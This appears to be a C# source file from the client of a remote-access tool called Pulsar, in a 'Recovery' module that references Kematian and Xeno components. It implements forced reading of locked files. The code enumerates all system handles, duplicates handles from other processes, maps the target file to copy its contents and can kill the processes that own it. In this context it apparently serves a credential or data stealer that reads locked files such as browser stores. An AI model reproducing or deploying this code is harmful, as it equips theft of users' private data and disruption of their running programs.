using Microsoft.Win32;
using Pulsar.Client.Kematian.HelpingMethods;
using Pulsar.Client.Recovery.Utilities.Xeno;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static Pulsar.Client.Recovery.Utilities.Xeno.InternalStructsXeno;

class FileHandlerXeno
{
    public static string GetPathFromHandle(IntPtr file)
    {
        uint FILE_NAME_NORMALIZED = 0x0;

        StringBuilder FileNameBuilder = new StringBuilder(32767 + 2);//+2 for a possible null byte?
        uint pathLen = NativeMethodsXeno.GetFinalPathNameByHandleW(file, FileNameBuilder, (uint)FileNameBuilder.Capacity, FILE_NAME_NORMALIZED);
        if (pathLen == 0)
        {
            return null;
        }
        string FileName = FileNameBuilder.ToString(0, (int)pathLen);
        return FileName;
    }

    public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
    {
        newHandle = IntPtr.Zero;
        uint PROCESS_DUP_HANDLE = 0x0040;
        uint DUPLICATE_SAME_ACCESS = 0x00000002;
        IntPtr procHandle = NativeMethodsXeno.OpenProcess(PROCESS_DUP_HANDLE, false, (uint)sourceProc);
        if (procHandle == IntPtr.Zero)
        {
            return false;
        }

        IntPtr targetHandle = IntPtr.Zero;

        if (!NativeMethodsXeno.DuplicateHandle(procHandle, sourceHandle, NativeMethodsXeno.GetCurrentProcess(), ref targetHandle, 0, false, DUPLICATE_SAME_ACCESS))
        {
            NativeMethodsXeno.CloseHandle(procHandle);
            return false;

        }
        newHandle = targetHandle;
        NativeMethodsXeno.CloseHandle(procHandle);
        return true;
    }

    public static byte[] ReadFileBytesFromHandle(IntPtr handle)
    {
        uint PAGE_READONLY = 0x02;
        uint FILE_MAP_READ = 0x04;
        IntPtr fileMapping = NativeMethodsXeno.CreateFileMappingA(handle, IntPtr.Zero, PAGE_READONLY, 0, 0, null);
        if (fileMapping == IntPtr.Zero)
        {
            return null;
        }

        if (!NativeMethodsXeno.GetFileSizeEx(handle, out ulong fileSize))
        {
            NativeMethodsXeno.CloseHandle(fileMapping);
            return null;
        }

        IntPtr BaseAddress = NativeMethodsXeno.MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, (UIntPtr)fileSize);
        if (BaseAddress == IntPtr.Zero)
        {
            NativeMethodsXeno.CloseHandle(fileMapping);
            return null;
        }

        byte[] FileData = new byte[fileSize];

        Marshal.Copy(BaseAddress, FileData, 0, (int)fileSize);

        NativeMethodsXeno.UnmapViewOfFile(BaseAddress);
        NativeMethodsXeno.CloseHandle(fileMapping);

        return FileData;
    }

    public static bool KillProcess(int pid, uint exitcode = 0)
    {
        uint PROCESS_TERMINATE = 0x0001;
        IntPtr ProcessHandle = NativeMethodsXeno.OpenProcess(PROCESS_TERMINATE, false, (uint)pid);
        if (ProcessHandle == IntPtr.Zero)
        {
            return false;
        }

        bool result = NativeMethodsXeno.TerminateProcess(ProcessHandle, exitcode);
        NativeMethodsXeno.CloseHandle(ProcessHandle);
        return result;
    }

    public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
    {
        byte[] fileContent = ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
        if (fileContent == null)
        {
            return null;
        }
        try
        {
            return Encoding.UTF8.GetString(fileContent);
        }
        catch
        {
        }
        return null;
    }

    public static bool GetProcessLockingFile(string filePath, out int[] process)
    {
        process = null;
        uint ERROR_MORE_DATA = 0xEA;

        string key = Guid.NewGuid().ToString();
        if (NativeMethodsXeno.RmStartSession(out uint SessionHandle, 0, key) != 0)
        {
            return false;
        }

        string[] resourcesToCheckAgaist = new string[] { filePath };
        if (NativeMethodsXeno.RmRegisterResources(SessionHandle, (uint)resourcesToCheckAgaist.Length, resourcesToCheckAgaist, 0, null, 0, null) != 0)
        {
            NativeMethodsXeno.RmEndSession(SessionHandle);
            return false;
        }



        while (true)
        {
            uint nProcInfo = 0;
            uint status = NativeMethodsXeno.RmGetList(SessionHandle, out uint nProcInfoNeeded, ref nProcInfo, null, out RM_REBOOT_REASON RebootReasions);
            if (status != ERROR_MORE_DATA)
            {
                NativeMethodsXeno.RmEndSession(SessionHandle);
                process = new int[0];
                return true;
            }
            uint oldnProcInfoNeeded = nProcInfoNeeded;
            RM_PROCESS_INFO[] AffectedApps = new RM_PROCESS_INFO[nProcInfoNeeded];
            nProcInfo = nProcInfoNeeded;
            status = NativeMethodsXeno.RmGetList(SessionHandle, out nProcInfoNeeded, ref nProcInfo, AffectedApps, out RebootReasions);
            if (status == 0)
            {
                process = new int[AffectedApps.Length];
                for (int i = 0; i < AffectedApps.Length; i++)
                {
                    process[i] = (int)AffectedApps[i].Process.dwProcessId;
                }
                break;
            }
            if (oldnProcInfoNeeded != nProcInfoNeeded)
            {
                continue;
            }
            else
            {
                NativeMethodsXeno.RmEndSession(SessionHandle);
                return false;
            }
        }
        NativeMethodsXeno.RmEndSession(SessionHandle);
        return true;
    }

    public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire = false)
    {
        try
        {
            return File.ReadAllBytes(filePath);
        }
        catch (Exception e)
        {
            if (e.HResult != -2147024864) //this is the error for if the file is being used by another process
            {
                return null;
            }
        }

        bool Pidless = false;

        if (!GetProcessLockingFile(filePath, out int[] process))
        {
            Pidless = true;
        }

        uint dwSize = 0;
        uint status = 0;
        uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;


        int HandleStructSize = Marshal.SizeOf(typeof(InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

        IntPtr pInfo = Marshal.AllocHGlobal(HandleStructSize);
        do
        {
            status = NativeMethodsXeno.NtQuerySystemInformation(InternalStructsXeno.SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pInfo, dwSize, out dwSize);
            if (status == STATUS_INFO_LENGTH_MISMATCH)
            {
                pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
            }
        } while (status != 0);


        //ULONG_PTR NumberOfHandles;
        //ULONG_PTR Reserved;
        //SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];

        IntPtr pInfoBackup = pInfo;

        ulong NumOfHandles = (ulong)Marshal.ReadIntPtr(pInfo);

        pInfo += 2 * IntPtr.Size;//skip past the number of handles and the reserved and start at the handles.

        byte[] result = null;

        for (ulong i = 0; i < NumOfHandles; i++)
        {
            InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleInfo = Marshal.PtrToStructure<InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(pInfo + (int)(i * (uint)HandleStructSize));


            if (!Pidless && !process.Contains((int)(uint)HandleInfo.UniqueProcessId))
            {
                continue;
            }


            if (DupHandle((int)HandleInfo.UniqueProcessId, (IntPtr)(ulong)HandleInfo.HandleValue, out IntPtr duppedHandle))
            {
                if (NativeMethodsXeno.GetFileType(duppedHandle) != InternalStructsXeno.FileType.FILE_TYPE_DISK)
                {
                    NativeMethodsXeno.CloseHandle(duppedHandle);
                    continue;
                }

                string name = GetPathFromHandle(duppedHandle);

                if (name == null)
                {
                    NativeMethodsXeno.CloseHandle(duppedHandle);
                    continue;
                }

                if (name.StartsWith("\\\\?\\"))
                {
                    name = name.Substring(4);
                }

                if (name == filePath)
                {
                    result = ReadFileBytesFromHandle(duppedHandle);
                    NativeMethodsXeno.CloseHandle(duppedHandle);
                    if (result != null)
                    {
                        break;
                    }
                }

                NativeMethodsXeno.CloseHandle(duppedHandle);

            }


        }
        Marshal.FreeHGlobal(pInfoBackup);

        if (result == null && killOwningProcessIfCouldntAquire)
        {
            foreach (int i in process)
            {
                KillProcess(i);
            }

            try
            {
                result = File.ReadAllBytes(filePath);
            }
            catch
            {
            }

        }

        return result;
    }
}